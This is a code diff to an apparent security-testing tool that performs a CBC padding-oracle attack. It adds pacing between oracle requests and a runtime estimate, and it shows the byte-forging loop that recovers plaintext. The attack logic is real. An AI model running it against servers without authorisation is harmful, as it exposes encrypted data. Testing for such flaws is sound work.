@@ -502,6 +502,16 @@ def decrypt_block(c: Cand, codec: Codec, prev: bytes, target: bytes, classify, *
                   should_stop=lambda: False) -> tuple[bytes, bytes]:
     """Recover the intermediate state of one target block and its plaintext (I, Pt),
     where Pt = I XOR prev. Raises StopRequested if should_stop() turns true."""
+    sent = [0]
+
+    def query(blocks: bytes) -> bool:
+        # Pace every oracle query by `pause` (except the very first), so WSTG_PAUSE
+        # slows the whole attack, not only the repeats within one measurement.
+        if pause and sent[0]:
+            time.sleep(pause)
+        sent[0] += 1
+        return _oracle_ok(c, codec, blocks, classify, repeat, pause)
+
     inter = bytearray(bs)
     for pad in range(1, bs + 1):
         pos = bs - pad
@@ -513,14 +523,14 @@ def decrypt_block(c: Cand, codec: Codec, prev: bytes, target: bytes, classify, *
             if should_stop():
                 raise StopRequested()
             forged[pos] = guess
-            if not _oracle_ok(c, codec, bytes(forged) + target, classify, repeat, pause):
+            if not query(bytes(forged) + target):
                 continue
             if pad == 1 and pos > 0:
                 # A false hit when the real last byte is already 0x02..: changing the
                 # byte before it must keep the padding valid for a true 0x01.
                 probe = bytearray(forged)
                 probe[pos - 1] ^= 0xff
-                if not _oracle_ok(c, codec, bytes(probe) + target, classify, repeat, pause):
+                if not query(bytes(probe) + target):
                     continue
             found = guess
             break
@@ -593,8 +603,9 @@ def run_decrypt(args) -> int:
         print("the oracle signal is not clear enough to decrypt (valid-padding and bad-padding "
               "responses are too close); re-run the step-3 probe.", file=sys.stderr)
         return 4
+    pace = f"; ~{args.pause}s between requests (about {bs * 128 * (args.pause + 1) / 60:.0f} min)" if args.pause else ""
     print(f"# oracle signal: valid padding ~ {ref_ok.status}/{ref_ok.size}B, "
-          f"invalid ~ {ref_bad.status}/{ref_bad.size}B. Up to {bs * 256} requests for this block.",
+          f"invalid ~ {ref_bad.status}/{ref_bad.size}B. Up to {bs * 256} requests for this block{pace}.",
           flush=True)
 
     prev, target = raw[-2 * bs:-bs], raw[-bs:]
